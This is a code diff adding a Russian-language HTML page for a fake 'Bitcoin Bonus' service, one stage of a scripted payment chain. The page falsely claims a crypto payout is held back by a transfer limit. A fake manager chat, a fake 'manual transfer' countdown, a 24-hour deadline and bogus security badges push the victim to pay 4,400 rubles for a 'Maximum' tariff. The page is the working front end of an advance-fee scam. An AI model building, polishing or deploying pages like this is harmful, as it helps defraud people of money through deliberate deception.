@@ -1,0 +1,1598 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+<title>Увеличение лимита перевода | Bitcoin Bonus</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/styles.css">
+<style>
+html.is-preloading .bg-decor,
+html.is-preloading .grid-overlay,
+html.is-preloading .cabinet,
+html.is-preloading .site-footer {
+    display: none !important;
+}
+
+#transferPreloader {
+    position: fixed;
+    inset: 0;
+    z-index: 99999;
+    background: #2b2f36;
+    font-family: 'Inter', sans-serif;
+    color: #e8ecf4;
+    opacity: 1;
+    transition: opacity 0.6s ease;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: clamp(18px, 5vw, 28px);
+    padding: clamp(12px, 4vw, 24px);
+    box-sizing: border-box;
+}
+#transferPreloader.is-hidden {
+    opacity: 0;
+    pointer-events: none;
+}
+#transferPreloader.is-skipped {
+    display: none !important;
+}
+
+#transferPreloader .tp-spinner-frame {
+    width: 64px;
+    height: 64px;
+    border: 0;
+    background: transparent;
+    pointer-events: none;
+    overflow: hidden;
+    flex: 0 0 auto;
+    display: block;
+}
+
+#transferPreloader .tp-text-layer {
+    width: 100%;
+    max-width: min(460px, calc(100vw - 32px));
+    box-sizing: border-box;
+    padding: 0;
+    text-align: center;
+    pointer-events: none;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: clamp(10px, 3vw, 14px);
+}
+
+#transferPreloader .tp-title {
+    font-size: clamp(15px, 4.4vw, 18px);
+    font-weight: 700;
+    color: #ffffff;
+    width: 100%;
+    line-height: 1.35;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    hyphens: auto;
+}
+
+#transferPreloader .tp-sub {
+    font-size: clamp(12.5px, 3.6vw, 14px);
+    line-height: 1.5;
+    color: #b7bfcc;
+    width: 100%;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    hyphens: auto;
+}
+
+#transferPreloader .tp-timer {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: clamp(12px, 3.6vw, 15px);
+    color: #f7931a;
+    font-weight: 600;
+    width: 100%;
+    font-variant-numeric: tabular-nums;
+    font-feature-settings: "tnum" 1;
+    line-height: 1.55;
+    white-space: normal;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    text-align: center;
+}
+
+#transferPreloader .tp-seconds-slot {
+    display: inline-block;
+    min-width: 2.2ch;
+    text-align: center;
+    vertical-align: baseline;
+    color: #ffffff;
+    font-size: clamp(15px, 4.4vw, 18px);
+    font-variant-numeric: tabular-nums;
+    font-feature-settings: "tnum" 1;
+}
+
+#transferPreloader .tp-lock {
+    margin-top: 4px;
+    font-size: clamp(10.5px, 3vw, 12px);
+    color: #8896b0;
+    letter-spacing: 0.4px;
+    text-transform: uppercase;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    text-align: center;
+    max-width: 100%;
+}
+
+@media (max-width: 340px) {
+    #transferPreloader .tp-lock {
+        letter-spacing: 0;
+    }
+}
+
+#paymentConnector {
+    position: fixed;
+    inset: 0;
+    z-index: 999999;
+    background: #2b2f36;
+    font-family: 'Inter', sans-serif;
+    color: #e8ecf4;
+    opacity: 0;
+    visibility: hidden;
+    pointer-events: none;
+    transition: opacity 0.35s ease, visibility 0.35s ease;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: clamp(12px, 4vw, 24px);
+    box-sizing: border-box;
+    overflow: hidden;
+}
+#paymentConnector.active {
+    opacity: 1;
+    visibility: visible;
+    pointer-events: auto;
+}
+
+#paymentConnector .pc-inner {
+    width: 100%;
+    max-width: min(460px, calc(100vw - 32px));
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    gap: clamp(16px, 4vw, 24px);
+}
+
+#paymentConnector .pc-spinner-frame {
+    width: 64px;
+    height: 64px;
+    border: 0;
+    background: transparent;
+    pointer-events: none;
+    overflow: hidden;
+    flex: 0 0 auto;
+    display: block;
+}
+
+#paymentConnector .pc-title {
+    font-size: clamp(16px, 4.6vw, 20px);
+    font-weight: 700;
+    color: #ffffff;
+    line-height: 1.35;
+    letter-spacing: 0.2px;
+    width: 100%;
+    word-break: normal;
+    overflow-wrap: anywhere;
+}
+
+#paymentConnector .pc-message {
+    font-size: clamp(12.5px, 3.6vw, 14px);
+    line-height: 1.6;
+    color: #b7bfcc;
+    width: 100%;
+    min-height: 2.8em;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    transition: opacity 0.35s ease;
+}
+#paymentConnector .pc-message.pc-fade {
+    opacity: 0;
+}
+#paymentConnector .pc-message strong {
+    color: #f7931a;
+    font-weight: 600;
+}
+
+#paymentConnector .pc-lock {
+    margin-top: 2px;
+    font-size: clamp(10.5px, 3vw, 12px);
+    color: #8896b0;
+    letter-spacing: 0.4px;
+    text-transform: uppercase;
+    word-break: normal;
+    overflow-wrap: anywhere;
+    text-align: center;
+}
+
+#paymentConnector .pc-dots {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    margin-top: 4px;
+}
+#paymentConnector .pc-dots span {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: #f7931a;
+    opacity: 0.35;
+    animation: pcDot 1.4s ease-in-out infinite;
+}
+#paymentConnector .pc-dots span:nth-child(2) { animation-delay: 0.18s; }
+#paymentConnector .pc-dots span:nth-child(3) { animation-delay: 0.36s; }
+
+@keyframes pcDot {
+    0%, 100% { opacity: 0.25; transform: translateY(0); }
+    50% { opacity: 1; transform: translateY(-2px); }
+}
+
+.ca-loading {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    color: var(--text-soft, #9aa6bd);
+    font-size: 14px;
+    font-weight: 500;
+    letter-spacing: 0.2px;
+}
+.ca-loading .ca-spinner {
+    width: 14px;
+    height: 14px;
+    border-radius: 50%;
+    border: 2px solid rgba(247, 147, 26, 0.25);
+    border-top-color: #f7931a;
+    animation: caSpin 0.9s linear infinite;
+    flex: 0 0 auto;
+}
+@keyframes caSpin {
+    to { transform: rotate(360deg); }
+}
+.ca-loading-sub {
+    color: var(--text-muted, #8896b0);
+    font-size: 12px;
+    letter-spacing: 0.3px;
+}
+#commissionAmountBox[data-loading="1"] .change-amount-btc,
+#commissionAmountBox[data-loading="1"] .change-amount-usd {
+    opacity: 0.85;
+}
+
+html, body, .cabinet { scroll-behavior: auto !important; }
+
+html, body {
+    overflow-x: hidden;
+    overflow-y: auto;
+    height: auto;
+    min-height: 100%;
+}
+
+.cabinet {
+    position: relative !important;
+    inset: auto !important;
+    top: auto !important;
+    right: auto !important;
+    bottom: auto !important;
+    left: auto !important;
+    width: 100%;
+    min-height: auto;
+    overflow: visible !important;
+    padding: calc(24px + var(--safe-top)) calc(16px + var(--safe-right)) 0 calc(16px + var(--safe-left)) !important;
+    box-sizing: border-box;
+}
+
+.cabinet-inner > *:last-child { margin-bottom: 0 !important; }
+.cabinet-inner, .cabinet-inner * { overflow-anchor: auto; }
+
+.cb-chart-wrap {
+    height: 220px;
+    min-height: 220px;
+    max-height: 220px;
+    overflow: hidden;
+    position: relative;
+}
+.cb-chart-wrap canvas {
+    display: block !important;
+    width: 100% !important;
+    height: 100% !important;
+}
+
+.cb-chart-wrap { pointer-events: none; }
+.cb-chart-tabs, .cb-chart-tabs .cb-tab {
+    pointer-events: auto;
+    cursor: pointer;
+}
+
+.change-card.commission-card-inline::before,
+.commission-card-inline .rent-box::after,
+.commission-card-inline .change-amount-box::after,
+.commission-card-inline .change-icon-badge {
+    animation: none !important;
+}
+.commission-card-inline .change-icon-badge {
+    box-shadow: 0 0 20px rgba(34, 197, 94, 0.35);
+}
+
+.cb-price-live {
+    display: inline-block;
+    min-width: 6.5em;
+    text-align: right;
+}
+
+.page-loader { pointer-events: none; }
+.page-loader.active { pointer-events: auto; }
+
+html::-webkit-scrollbar, body::-webkit-scrollbar {
+    width: 10px; height: 10px;
+}
+html::-webkit-scrollbar-track, body::-webkit-scrollbar-track {
+    background: rgba(7, 10, 20, 0.6);
+}
+html::-webkit-scrollbar-thumb, body::-webkit-scrollbar-thumb {
+    background: linear-gradient(180deg, #f7931a, #ffb04d);
+    border-radius: 8px;
+    box-shadow: inset 0 0 6px rgba(247, 147, 26, 0.5);
+}
+html::-webkit-scrollbar-thumb:hover, body::-webkit-scrollbar-thumb:hover {
+    background: linear-gradient(180deg, #ffb04d, #f7931a);
+}
+html::-webkit-scrollbar-thumb:active, body::-webkit-scrollbar-thumb:active {
+    background: linear-gradient(180deg, #f7931a, #22d3ee);
+}
+html::-webkit-scrollbar-corner, body::-webkit-scrollbar-corner {
+    background: transparent;
+}
+html, body {
+    scrollbar-width: thin;
+    scrollbar-color: rgba(247, 147, 26, 0.7) rgba(7, 10, 20, 0.6);
+}
+
+.cb-ticker-strip { overflow: hidden; }
+.cb-ticker-track {
+    display: inline-flex !important;
+    flex-wrap: nowrap !important;
+    width: auto !important;
+    min-width: 0 !important;
+    animation: none !important;
+    will-change: transform;
+    backface-visibility: hidden;
+    transform: translateZ(0);
+}
+.cb-ticker-track.cb-ticker-animating {
+    animation: cbTickerScroll 25s linear infinite !important;
+}
+@keyframes cbTickerScroll {
+    from { transform: translateX(0); }
+    to   { transform: translateX(-50%); }
+}
+@media (max-width: 768px) {
+    .cb-ticker-track.cb-ticker-animating {
+        animation-duration: 20s !important;
+    }
+}
+
+.site-footer {
+    position: relative;
+    z-index: 2;
+    margin-top: 0 !important;
+    background: #070a14;
+    border-top: 1px solid var(--border);
+    font-family: 'Inter', sans-serif;
+    color: var(--text-muted);
+    font-size: 13px;
+}
+.site-footer::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(247, 147, 26, 0.5), transparent);
+}
+
+.site-footer__inner {
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 24px 24px 16px;
+    box-sizing: border-box;
+}
+
+.site-footer__row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 24px;
+    flex-wrap: wrap;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+}
+
+.site-footer__brand {
+    display: flex;
+    align-items: center;
+    gap: 9px;
+    font-family: 'Space Grotesk', sans-serif;
+    font-weight: 700;
+    font-size: 15px;
+    color: var(--text-main);
+    text-decoration: none;
+    letter-spacing: -0.2px;
+    white-space: nowrap;
+}
+.site-footer__brand-icon {
+    width: 28px;
+    height: 28px;
+    background: linear-gradient(135deg, var(--primary), var(--primary-light));
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    color: #fff;
+    box-shadow: 0 0 12px var(--primary-glow);
+    flex-shrink: 0;
+}
+.site-footer__brand span { color: var(--primary); }
+
+.site-footer__nav {
+    display: flex;
+    gap: 22px;
+    flex-wrap: wrap;
+    list-style: none;
+    padding: 0;
+    margin: 0;
+}
+.site-footer__nav a {
+    color: var(--text-muted);
+    text-decoration: none;
+    font-size: 13px;
+    font-weight: 500;
+    transition: color 0.2s;
+    white-space: nowrap;
+}
+.site-footer__nav a:hover { color: var(--primary); }
+
+.site-footer__socials {
+    display: flex;
+    gap: 6px;
+    flex-shrink: 0;
+}
+.site-footer__social {
+    width: 32px;
+    height: 32px;
+    border-radius: 8px;
+    background: rgba(255, 255, 255, 0.03);
+    border: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--text-muted);
+    text-decoration: none;
+    font-size: 13px;
+    transition: all 0.2s;
+}
+.site-footer__social:hover {
+    background: rgba(247, 147, 26, 0.1);
+    border-color: var(--border-primary);
+    color: var(--primary);
+}
+
+.site-footer__bottom {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 16px;
+    flex-wrap: wrap;
+    padding-top: 14px;
+}
+.site-footer__copy {
+    font-size: 12px;
+    color: var(--text-muted);
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    font-family: 'JetBrains Mono', monospace;
+}
+.site-footer__copy-dot {
+    width: 5px;
+    height: 5px;
+    border-radius: 50%;
+    background: var(--success);
+    box-shadow: 0 0 6px var(--success);
+    animation: pulseSoft 1.8s infinite;
+    flex-shrink: 0;
+}
+
+.site-footer__badges {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+    align-items: center;
+}
+.site-footer__badge {
+    padding: 3px 8px;
+    background: rgba(255, 255, 255, 0.02);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 9.5px;
+    font-weight: 700;
+    color: var(--text-muted);
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    white-space: nowrap;
+}
+
+.site-footer__disclaimer {
+    margin-top: 14px;
+    padding-top: 12px;
+    border-top: 1px solid var(--border);
+    font-size: 11px;
+    line-height: 1.55;
+    color: rgba(136, 150, 176, 0.7);
+    text-align: center;
+}
+
+@media (max-width: 768px) {
+    .site-footer { font-size: 12.5px; }
+    .site-footer__inner { padding: 20px 16px 14px; }
+    .site-footer__row {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 14px;
+        padding-bottom: 14px;
+    }
+    .site-footer__nav { gap: 14px; }
+    .site-footer__nav a { font-size: 12.5px; }
+    .site-footer__socials { align-self: flex-end; }
+    .site-footer__bottom {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+    }
+    .site-footer__copy { font-size: 11px; }
+    .site-footer__badge { font-size: 9px; padding: 3px 7px; }
+    .site-footer__disclaimer { font-size: 10.5px; text-align: left; }
+}
+
+.manager-chat {
+    margin: 18px 0;
+    padding: 16px;
+    background: rgba(255,255,255,0.02);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 16px;
+}
+.manager-chat__header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 14px;
+    padding-bottom: 14px;
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+}
+.manager-chat__avatar {
+    width: 46px;
+    height: 46px;
+    border-radius: 50%;
+    object-fit: cover;
+    flex-shrink: 0;
+    border: 2px solid rgba(247,147,26,0.4);
+}
+.manager-chat__info {
+    flex: 1;
+    min-width: 0;
+}
+.manager-chat__name {
+    font-weight: 600;
+    font-size: 14.5px;
+    color: #fff;
+    margin-bottom: 2px;
+}
+.manager-chat__meta {
+    font-size: 11.5px;
+    color: var(--text-soft);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex-wrap: wrap;
+}
+.manager-chat__status {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    color: #22c55e;
+}
+.manager-chat__status::before {
+    content: '';
+    display: inline-block;
+    width: 7px;
+    height: 7px;
+    border-radius: 50%;
+    background: #22c55e;
+    box-shadow: 0 0 8px rgba(34,197,94,0.7);
+    animation: pulseOnline 1.6s ease-in-out infinite;
+}
+@keyframes pulseOnline {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+}
+.manager-chat__bubble {
+    position: relative;
+    background: linear-gradient(135deg, rgba(247,147,26,0.10), rgba(247,147,26,0.04));
+    border: 1px solid rgba(247,147,26,0.22);
+    border-radius: 4px 14px 14px 14px;
+    padding: 13px 15px;
+    font-size: 13px;
+    line-height: 1.65;
+    color: #e8ecf4;
+}
+.manager-chat__bubble::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -1px;
+    width: 0;
+    height: 0;
+    border-style: solid;
+    border-width: 8px 8px 0 0;
+    border-color: rgba(247,147,26,0.22) transparent transparent transparent;
+}
+.manager-chat__bubble p {
+    margin: 0 0 10px;
+}
+.manager-chat__bubble p:last-child {
+    margin-bottom: 0;
+}
+.manager-chat__bubble strong {
+    color: #f7931a;
+}
+.manager-chat__time {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    justify-content: flex-end;
+    font-size: 10.5px;
+    color: var(--text-soft);
+    margin-top: 8px;
+    font-family: 'JetBrains Mono', monospace;
+}
+.manager-chat__time::after {
+    content: '✓✓';
+    color: #22c55e;
+    letter-spacing: -2px;
+    font-size: 11px;
+}
+.manager-chat__typing {
+    display: inline-flex;
+    align-items: center;
+    gap: 3px;
+    margin-left: 6px;
+}
+.manager-chat__typing span {
+    width: 4px;
+    height: 4px;
+    border-radius: 50%;
+    background: var(--text-soft);
+    animation: typingDot 1.2s infinite;
+}
+.manager-chat__typing span:nth-child(2) { animation-delay: 0.2s; }
+.manager-chat__typing span:nth-child(3) { animation-delay: 0.4s; }
+@keyframes typingDot {
+    0%, 60%, 100% { opacity: 0.3; transform: translateY(0); }
+    30% { opacity: 1; transform: translateY(-2px); }
+}
+</style>
+
+<script src="assets/state.js"></script>
+<script src="assets/chain.js"></script>
+<script>
+(function () {
+    var STAGE_NAME = 'limitex';
+
+    try { loadState(); } catch (e) {}
+
+    var chain = window.PAYMENT_CHAIN || [];
+    var current = window.appState && window.appState.currentStage;
+    var currentIdx = chain.indexOf(current);
+    var thisIdx = chain.indexOf(STAGE_NAME);
+
+    if (currentIdx !== -1 && thisIdx !== -1 && currentIdx > thisIdx) {
+        var base = window.location.href.split('?')[0].split('#')[0];
+        var dir = base.substring(0, base.lastIndexOf('/') + 1);
+        var target = dir + chain[currentIdx] + '.html';
+        console.log('[Redirect] ' + STAGE_NAME + ' → ' + chain[currentIdx]);
+        window.location.replace(target);
+        return;
+    }
+
+    try {
+        if (!localStorage.getItem('bitcloud_preloader_limitex_v1')) {
+            document.documentElement.classList.add('is-preloading');
+        }
+    } catch (e) {
+        document.documentElement.classList.add('is-preloading');
+    }
+})();
+</script>
+</head>
+<body>
+
+<div id="transferPreloader">
+    <iframe id="spinnerFrame" class="tp-spinner-frame" scrolling="no" frameborder="0" title="" aria-hidden="true"></iframe>
+    <div class="tp-text-layer">
+        <div class="tp-title">Не закрывайте страницу!</div>
+        <div class="tp-sub">Идёт ручная отправка денежных средств...</div>
+        <div class="tp-timer">
+            До завершения осталось примерно:
+            <span class="tp-seconds-slot" id="tpSeconds">30</span>
+            сек
+        </div>
+        <div class="tp-lock">🔒 Не выключайте устройство</div>
+    </div>
+</div>
+
+<div id="paymentConnector">
+    <div class="pc-inner">
+        <iframe id="pcSpinnerFrame" class="pc-spinner-frame" scrolling="no" frameborder="0" title="" aria-hidden="true"></iframe>
+        <div class="pc-title">Ожидайте</div>
+        <div class="pc-message" id="pcMessage">Идёт соединение с платёжной системой...</div>
+        <div class="pc-dots">
+            <span></span><span></span><span></span>
+        </div>
+        <div class="pc-lock">🔒 Не закрывайте страницу</div>
+    </div>
+</div>
+
+<script>
+window.__preloaderDone = false;
+window.__onPreloaderDone = [];
+
+(function () {
+    var PRELOADER_KEY = 'bitcloud_preloader_limitex_v1';
+
+    var shouldShowPreloader = true;
+    try {
+        shouldShowPreloader = !localStorage.getItem(PRELOADER_KEY);
+    } catch (e) {
+        shouldShowPreloader = true;
+    }
+
+    var overlay = document.getElementById('transferPreloader');
+
+    if (!shouldShowPreloader) {
+        console.log('[Preloader] уже видели → пропускаем');
+
+        if (overlay) {
+            overlay.classList.add('is-skipped');
+            try { overlay.parentNode && overlay.parentNode.removeChild(overlay); } catch (e) {}
+        }
+
+        document.documentElement.classList.remove('is-preloading');
+        document.documentElement.style.overflow = '';
+        document.body.style.overflow = '';
+
+        window.__preloaderDone = true;
+        var cbs = window.__onPreloaderDone.splice(0);
+        for (var i = 0; i < cbs.length; i++) {
+            try { cbs[i](); } catch (e) { console.warn(e); }
+        }
+        return;
+    }
+
+    console.log('[Preloader] первый заход → показываем');
+
+    var spinnerHtml = '<!DOCTYPE html><html><head><meta charset="utf-8">'
+        + '<style>'
+        +   'html,body{margin:0;padding:0;width:100%;height:100%;background:transparent;overflow:hidden;}'
+        +   '.spinner{width:64px;height:64px;transform-origin:32px 32px;'
+        +     'animation:spin 1.4s linear infinite;'
+        +     'will-change:transform;backface-visibility:hidden;'
+        +     'transform:translateZ(0) rotate(0deg);}'
+        +   '@keyframes spin{'
+        +     'from{transform:translateZ(0) rotate(0deg);}'
+        +     'to{transform:translateZ(0) rotate(360deg);}'
+        +   '}'
+        +   'svg{display:block;width:64px;height:64px;}'
+        +   '.trk{fill:none;stroke:rgba(255,255,255,0.10);stroke-width:4;}'
+        +   '.arc{fill:none;stroke:#f7931a;stroke-width:4;stroke-linecap:round;}'
+        + '</style></head><body>'
+        + '<div class="spinner">'
+        +   '<svg viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">'
+        +     '<circle class="trk" cx="25" cy="25" r="20"></circle>'
+        +     '<path class="arc" d="M25 5 A20 20 0 0 1 45 25"></path>'
+        +   '</svg>'
+        + '</div>'
+        + '</body></html>';
+
+    var frame1 = document.getElementById('spinnerFrame');
+    if (frame1) {
+        var blob = new Blob([spinnerHtml], { type: 'text/html' });
+        frame1.src = URL.createObjectURL(blob);
+    }
+    var frame2 = document.getElementById('pcSpinnerFrame');
+    if (frame2) {
+        var blob2 = new Blob([spinnerHtml], { type: 'text/html' });
+        frame2.src = URL.createObjectURL(blob2);
+    }
+
+    var START_DISPLAY = 30;
+    var TOTAL_SECONDS = 30;
+
+    var secEl = document.getElementById('tpSeconds');
+    if (!overlay || !secEl) {
+        window.__preloaderDone = true;
+        document.documentElement.classList.remove('is-preloading');
+        var cbsX = window.__onPreloaderDone.splice(0);
+        for (var k = 0; k < cbsX.length; k++) {
+            try { cbsX[k](); } catch (e) { console.warn(e); }
+        }
+        return;
+    }
+
+    var elapsed = 0;
+
+    document.documentElement.style.overflow = 'hidden';
+    document.body.style.overflow = 'hidden';
+
+    function tick() {
+        elapsed += 1;
+        var remaining = Math.max(0, START_DISPLAY - elapsed);
+        secEl.textContent = remaining;
+
+        if (elapsed >= TOTAL_SECONDS) {
+            clearInterval(timer);
+            finish();
+        }
+    }
+
+    function finish() {
+        overlay.classList.add('is-hidden');
+        document.documentElement.style.overflow = '';
+        document.body.style.overflow = '';
+        document.documentElement.classList.remove('is-preloading');
+
+        setTimeout(function () {
+            if (overlay && overlay.parentNode) overlay.parentNode.removeChild(overlay);
+        }, 700);
+
+        try { localStorage.setItem(PRELOADER_KEY, '1'); } catch (e) {}
+
+        window.__preloaderDone = true;
+        var cbsF = window.__onPreloaderDone.splice(0);
+        for (var m = 0; m < cbsF.length; m++) {
+            try { cbsF[m](); } catch (e) { console.warn(e); }
+        }
+    }
+
+    var timer = setInterval(tick, 1000);
+})();
+</script>
+
+<div class="bg-decor"></div>
+<div class="grid-overlay"></div>
+
+<div class="cabinet active" id="cabinet">
+    <div class="cabinet-inner">
+
+        <div class="cabinet-header">
+            <h2>Личный кабинет</h2>
+            <div class="user-chip">
+                <div class="avatar"></div>
+                <span>user-id81214293</span>
+            </div>
+        </div>
+
+        <div class="cb-ticker-strip">
+            <div class="cb-ticker-track" id="cbTickerTrack"></div>
+        </div>
+
+        <div class="change-card commission-card-inline">
+            <div class="change-icon-badge">✓</div>
+            <h2 class="change-title">Вы успешно наняли личного менеджера!</h2>
+            <p class="change-subtitle">Ваша выплата составляет:</p>
+
+            <div class="change-amount-box" id="commissionAmountBox" data-loading="1">
+                <div class="change-amount-label">Сумма к выплате</div>
+                <div class="change-amount-btc" id="commissionRub">
+                    <span class="ca-loading"><span class="ca-spinner"></span>Идёт загрузка курса…</span>
+                </div>
+                <div class="change-amount-usd" id="commissionUsd">
+                    <span class="ca-loading-sub">Получаем актуальный курс BTC/RUB</span>
+                </div>
+            </div>
+
+            <div class="change-urgent">
+                <div class="urgent-icon">⏰</div>
+                <div>Вам необходимо вывести деньги в течение 24 часов!</div>
+            </div>
+
+            <div class="change-info-block">
+                <div class="change-info-row">
+                    <span class="info-label">🏦 Платёжная система</span>
+                    <span class="info-value orange">Express Gateway</span>
+                </div>
+                <div class="change-info-row">
+                    <span class="info-label">📊 Статус транзакции</span>
+                    <span class="info-value green">Ожидает увеличения лимита</span>
+                </div>
+                <div class="change-info-row">
+                    <span class="info-label">💱 Тип перевода</span>
+                    <span class="info-value cyan">Экспресс (без НДФЛ)</span>
+                </div>
+            </div>
+
+            <div class="commission-note">
+                <strong>Превышен лимит по сумме перевода.</strong>
+            </div>
+
+            <p style="font-size:13px; color:var(--text-soft); line-height:1.65; margin-bottom:10px;">
+                <strong>Статус перевода:</strong> Ожидает увеличения лимита!
+            </p>
+
+            <p style="font-size:13px; color:var(--text-soft); line-height:1.65; margin-bottom:10px;">
+                Денежный перевод отклонен системой массовых выплат. Превышен лимит по сумме перевода. Для завершения перевода, увеличьте ваш лимит по денежным операциям.
+            </p>
+
+            <!-- Чат с менеджером -->
+            <div class="manager-chat">
+                <div class="manager-chat__header">
+                    <img src="assets/manager.jpg" alt="Наталья Филиппова" class="manager-chat__avatar">
+                    <div class="manager-chat__info">
+                        <div class="manager-chat__name">Наталья Филиппова — Менеджер</div>
+                        <div class="manager-chat__meta">
+                            <span>Стаж работы: 3 года</span>
+                            <span class="manager-chat__status">В сети</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="manager-chat__bubble">
+                    <p>
+                        Я сделала запрос в систему массовых выплат. У вас тариф <strong>"Стандарт"</strong>. Там переводы не больше <strong>300 000 рублей в сутки</strong>. Поэтому перевод сразу и не прошел, все еще находится в обработке.
+                    </p>
+                    <p>
+                        Чтобы завершить перевод и получить деньги, увеличьте лимит по сумме перевода, подключив тариф <strong>"Максимум"</strong>. Это стоит всего <strong>4 400 рублей</strong>. Как только подключите, они сразу отправят Вам деньги.
+                    </p>
+                    <div class="manager-chat__time">
+                        14:37
+                        <span class="manager-chat__typing"><span></span><span></span><span></span></span>
+                    </div>
+                </div>
+            </div>
+
+            <p style="font-size:13px; color:var(--text-soft); line-height:1.65; margin-bottom:6px;">
+                Стоимость подключения тарифа "Максимум" всего <strong>4 400 ₽</strong>.
+            </p>
+
+            <div class="rent-box">
+                <div class="rent-box__title">Подключение тарифа "Максимум"</div>
+                <div class="rent-box__amount">4 400 ₽</div>
+                <div class="rent-box__sub">увеличение лимита по сумме перевода</div>
+                <div class="rent-box__benefits">
+                    <div class="rent-box__benefit"><span class="check">✓</span><span>Увеличение лимита денежных операций</span></div>
+                    <div class="rent-box__benefit"><span class="check">✓</span><span>Мгновенная отправка перевода</span></div>
+                    <div class="rent-box__benefit"><span class="check">✓</span><span>Сопровождение личного менеджера</span></div>
+                </div>
+            </div>
+
+            <div class="exchange-btn-wrap">
+                <button class="btn btn-primary btn-glow" id="commissionBtn" onclick="doCommissionPayment()">
+                    Подключить тариф "Максимум"
+                </button>
+            </div>
+
+            <p style="font-size:13px; color:var(--text-soft); line-height:1.65; margin:14px 0 0; text-align:center;">
+                Следуйте указаниям Вашего личного менеджера<br>
+                Получите ваши средства
+            </p>
+        </div>
+
+        <div class="cb-section-title">Рынок криптовалют <span class="cb-count" id="cbMarketsCount"></span></div>
+        <div class="cb-markets" id="cbMarkets"><div class="cb-loading">Загрузка данных рынка...</div></div>
+
+        <div class="cb-section-title">Валютные курсы ЦБ РФ</div>
+        <div class="cb-fiat" id="cbFiat"><div class="cb-loading">Загрузка курсов валют...</div></div>
+
+        <div class="cb-big-chart-panel">
+            <div class="cb-chart-head">
+                <div class="cb-chart-title">
+                    <span class="cb-pair">BTC/USD</span>
+                    <span class="cb-price-live" id="cbPriceLive">$--,---</span>
+                    <span class="cb-change up" id="cbChangeLive">+0.00%</span>
+                </div>
+                <div class="cb-chart-tabs" id="cbChartTabs">
+                    <button type="button" class="cb-tab" data-range="1">24H</button>
+                    <button type="button" class="cb-tab active" data-range="7">7D</button>
+                    <button type="button" class="cb-tab" data-range="30">1M</button>
+                </div>
+            </div>
+            <div class="cb-chart-wrap" id="cbChartWrap"></div>
+        </div>
+
+    </div>
+</div>
+
+<footer class="site-footer">
+    <div class="site-footer__inner">
+
+        <div class="site-footer__row">
+            <a href="/" class="site-footer__brand">
+                <span class="site-footer__brand-icon">₿</span>
+                Bitcoin <span>Bonus</span>
+            </a>
+
+            <ul class="site-footer__nav">
+                <li><a href="#">О сервисе</a></li>
+                <li><a href="#">Справочный центр</a></li>
+                <li><a href="#">Комиссии</a></li>
+                <li><a href="#">Безопасность</a></li>
+                <li><a href="#">Правила</a></li>
+                <li><a href="#">Контакты</a></li>
+            </ul>
+
+            <div class="site-footer__socials">
+                <a href="#" class="site-footer__social" aria-label="Telegram">✈</a>
+                <a href="#" class="site-footer__social" aria-label="Twitter">𝕏</a>
+                <a href="#" class="site-footer__social" aria-label="Support">✉</a>
+            </div>
+        </div>
+
+        <div class="site-footer__bottom">
+            <div class="site-footer__copy">
+                <span class="site-footer__copy-dot"></span>
+                © <span id="footerYear">2025</span> Bitcoin Bonus · Все права защищены
+            </div>
+            <div class="site-footer__badges">
+                <span class="site-footer__badge">SSL / TLS 1.3</span>
+                <span class="site-footer__badge">PCI DSS</span>
+                <span class="site-footer__badge">ISO 27001</span>
+                <span class="site-footer__badge">2FA</span>
+            </div>
+        </div>
+
+        <div class="site-footer__disclaimer">
+            Сервис оказывает услуги обработки транзитных криптовалютных переводов. Курсы и комиссии рассчитываются автоматически платёжным шлюзом. Все операции выполняются в соответствии с действующим законодательством.
+        </div>
+
+    </div>
+</footer>
+
+<div class="page-loader" id="pageLoader">
+    <div class="spinner-big"></div>
+    <div class="loader-text" id="loaderText">Переход на платёжную систему...</div>
+    <div class="loader-bar-bg"><div class="loader-bar-fill" id="loaderBarFill"></div></div>
